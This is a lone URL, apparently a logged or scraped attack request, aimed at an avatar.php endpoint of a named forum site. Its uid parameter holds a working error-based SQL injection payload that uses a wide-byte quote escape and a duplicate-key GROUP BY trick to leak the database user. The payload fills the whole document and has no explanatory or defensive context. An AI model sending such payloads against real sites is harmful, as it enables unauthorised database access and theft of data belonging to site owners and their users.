http://bbs.ileehoo.com/uc_server/avatar.php?uid=%df' AND (SELECT 1791 FROM(SELECT COUNT(*),CONCAT(0x7e21,user(),0x217e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) -- yTqO&size=small
